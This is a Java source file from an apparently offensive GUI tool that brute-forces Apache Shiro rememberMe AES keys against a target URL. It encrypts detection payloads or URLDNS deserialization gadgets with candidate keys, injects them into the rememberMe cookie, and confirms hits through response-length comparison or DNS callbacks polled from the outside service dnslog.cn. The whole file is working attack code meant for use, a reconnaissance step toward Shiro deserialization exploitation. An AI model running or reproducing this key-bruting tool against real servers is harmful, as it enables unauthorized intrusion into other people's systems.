package cn.safe6.core.jobs;

import cn.safe6.controller.Controller;
import cn.safe6.core.Constants;
import cn.safe6.core.ControllersFactory;
import cn.safe6.payload.URLDNS;
import cn.safe6.util.HttpClientUtil;
import cn.safe6.util.PayloadEncryptTool;
import cn.safe6.util.ShiroTool;
import javafx.application.Platform;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.util.EntityUtils;


import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;
import java.util.concurrent.Callable;

/**
 *  爆破key
 */

public class BurstJob implements Callable<String> {
    private String url;
    private String method;
    private Map<String,Object> params;
    private List<String> keys;
    final private Controller controller = (Controller) ControllersFactory.controllers.get(Controller.class.getSimpleName());
    final private Map<String,Object> paramsContext = ControllersFactory.paramsContext;


    public BurstJob(String url, String method, Map<String,Object> params, List<String> keys) {
        this.url = url;
        this.method = method;
        this.params = params;
        this.keys = keys;
    }

    @Override
    public String call() {

        //是否用post提交
        boolean isPost = false;
        //默认错误长度
        int errLen = 0;
        //默认存在 remember
        boolean isExistMB =true;

        String rememberMe = paramsContext.get("rmeValue").toString();

        try {
            byte[] payload =ShiroTool.getDetectText();
            Controller.logUtil.printInfoLog("开始爆破默认key",false);

            //错误包长度
            Map<String, Object> header = (Map<String, Object>)paramsContext.get("header");
            if (header==null){
                header = new HashMap<>();
            }
            Object oldCookie = null;
            //在原有cookie后面追加
            if (header.get("cookie")!=null){
                oldCookie = header.get("cookie");
                if (!header.get("cookie").toString().contains(rememberMe)){
                    header.put("cookie",oldCookie+";"+rememberMe+"=123456");
                }
            }else {
                header.put("cookie",rememberMe+"=123456");
            }

            if(paramsContext.get("method").equals(Constants.METHOD_GET)){
                CloseableHttpResponse response = HttpClientUtil.httpGetRequest3(url,header);
                if (response!=null){
                   String data = EntityUtils.toString(response.getEntity(),"utf-8");
                   errLen = data.length();
                   if (!Arrays.toString(response.getAllHeaders()).contains(rememberMe)){
                       isExistMB = false;
                   }
                }

            }else {
                isPost = true;
                CloseableHttpResponse response = HttpClientUtil.httpPostRequest2(url,header,params);
                if (response!=null){
                    String data = EntityUtils.toString(response.getEntity(),"utf-8");
                    errLen = data.length();
                    if (!Arrays.toString(response.getAllHeaders()).contains(rememberMe)){
                        isExistMB = false;
                    }
                }
            }
            Map<String,String> dnslog = getDnslog();



            for (String key : keys) {
                Controller.logUtil.printInfoLog("检测"+key,false);
                String encryptData;

                if (paramsContext.get("checkType").toString().contains("dnslog")){
                    payload = URLDNS.getPayload(key+"."+dnslog.get("url"));
                }

                if (paramsContext.get("AES").equals(Constants.AES_GCM)){
                    encryptData = PayloadEncryptTool.AesGcmEncrypt(payload,key);
                }else {
                    encryptData = PayloadEncryptTool.AesCbcEncrypt(payload,key);
                }

                //请求包header超过8k会报header too large错误
                if (oldCookie!=null){
                    header.put("cookie",oldCookie+";"+rememberMe+"="+encryptData);
                }else {
                    header.put("cookie",rememberMe+"="+encryptData);
                }

                //System.out.println(header.get("cookie"));
                String data = null;
                CloseableHttpResponse response;
                String resHeader="";
                if(!isPost){
                    response = HttpClientUtil.httpGetRequest3(url,header);
                    if (response!=null){
                        resHeader = Arrays.toString(response.getAllHeaders());
                        data = EntityUtils.toString(response.getEntity(),"utf-8");
                    }
                }else {
                    response = HttpClientUtil.httpPostRequest2(url,header,params);
                    if (response!=null){
                        resHeader = Arrays.toString(response.getAllHeaders());
                        data = EntityUtils.toString(response.getEntity(),"utf-8");
                    }
                }

                //输出详情
                if (controller.isShowPayload.isSelected()){
                    //System.out.println(""+Controller.logUtil.getLog().getCaretPosition());
                    Controller.logUtil.printData(encryptData);
                    Controller.logUtil.printData(resHeader);
                }else {
                    Controller.logUtil.getLog().selectPositionCaret(Controller.logUtil.getLog().getText().length());
                }

                //dnslog
                if (paramsContext.get("checkType").toString().contains("dnslog")){
                    String record =getDnsLogRecord(dnslog);
                    if (record.contains(key)){
                        Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
                        paramsContext.put("oldKey", key);
                        controller.aesKey.setText(key);

                        break;
                    }
                }

                //用长度进行第一次判断
                if (data!=null&&errLen!=data.length()){
                    if (isExistMB&&resHeader.contains(rememberMe)){
                        Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
                        paramsContext.put("oldKey", key);
                        controller.aesKey.setText(key);
                        break;
                    }
                    Controller.logUtil.printAbortedLog("秘钥错误",false);

                }else {
                    if (isExistMB&&!resHeader.contains(rememberMe)){
                        Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
                        paramsContext.put("oldKey", key);
                        controller.aesKey.setText(key);
                        break;
                    }
                    Controller.logUtil.printAbortedLog("秘钥错误",false);
                }


            }
            Controller.logUtil.printInfoLog("爆破结束!",true);
        }catch (Exception e){
            e.printStackTrace();
        }finally {
            //Controller.logUtil.getLog().selectPositionCaret(controller.log.getText().length());
            Platform.runLater(() -> {
                controller.burstKey.setDisable(false);
            });
        }
        return "";
    }



    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }

    public String getMethod() {
        return method;
    }

    public void setMethod(String method) {
        this.method = method;
    }

    public Map<String, Object> getParams() {
        return params;
    }

    public void setParams(Map<String, Object> params) {
        this.params = params;
    }

    public List<String> getKeys() {
        return keys;
    }

    public void setKeys(List<String> keys) {
        this.keys = keys;
    }
    public Map<String,String> getDnslog(){
        HttpURLConnection connection = null;
        InputStream inputStream = null;
        BufferedReader reader = null;
        StringBuffer sb = new StringBuffer();
        Map<String,String> dnslog = null;

        try
        {
            connection = (HttpURLConnection)new URL("http://www.dnslog.cn/getdomain.php").openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);
            connection.connect();

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                dnslog = new HashMap<>();

                String sessinoId = connection.getHeaderField("Set-Cookie");
                sessinoId = sessinoId.split(";")[0];

                inputStream = connection.getInputStream();
                reader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                }

                dnslog.put("cookie",sessinoId);
                dnslog.put("url","http://"+sb.toString());
                return dnslog;
            }
        }
        catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                if (connection != null) connection.disconnect();
                if (inputStream != null) inputStream.close();
                if (reader != null) reader.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        return dnslog;
    }


    public String getDnsLogRecord(Map<String,String> dnslog) throws Exception{
        HttpURLConnection connection = null;
        InputStream inputStream = null;
        BufferedReader reader = null;
        StringBuffer sb = new StringBuffer();

        try {
            connection = (HttpURLConnection)new URL("http://www.dnslog.cn/getrecords.php").openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("Cookie", dnslog.get("cookie"));
            connection.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36");
            connection.setRequestProperty("connection", "close");
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            connection.connect();

            int responseCode = connection.getResponseCode();
            String line;
            if (responseCode == 200) {
                inputStream = connection.getInputStream();
                reader = new BufferedReader(new InputStreamReader(inputStream));

                while ((line = reader.readLine()) != null){
                    sb.append(line);
                }

            } else {
                return null;
            }
        } finally {
            try {
                if (connection != null) connection.disconnect();
                if (inputStream != null) inputStream.close();
                if (reader != null) reader.close();
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }

        return sb.toString();
    }

}
